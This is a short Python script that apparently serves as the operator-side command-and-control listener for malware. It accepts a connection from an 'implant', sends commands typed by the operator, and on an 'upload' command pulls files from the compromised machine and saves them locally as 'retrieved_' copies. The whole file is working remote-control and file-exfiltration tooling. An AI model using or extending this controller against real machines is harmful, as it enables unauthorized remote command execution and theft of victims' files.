import socket
import threading
import time

#threadPool = {}

ip,port = '127.0.0.1',4001

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.bind((ip,port))
    s.listen()
    conn,addr = s.accept()
    with conn:
        data = conn.recv(1024).decode()
        if data is hex:
            print('device id' + str(data))
        print('Connected by', addr)
        while True:
            cmd = input("Send command to implant: ")
            if cmd.split()[0] == 'upload':
                with open('retrieved_'+ cmd.split()[1], 'wb') as f:
                    print('file opened')
                    conn.send(cmd.encode())
                    while True:
                        print('receiving data...')
                        data = conn.recv(8192)
                        print(data)
                        #print('data=%s', (data))
                        if not data or data == b'':
                            break
                        if data.__contains__(b'ENDOFFILE'):
                            data = data[:data.index(b'ENDOFFILE')]
                            f.write(data)
                            break
                        f.write(data)

            else:
                conn.send(cmd.encode())
                data = conn.recv(32768).decode()
                print(data)







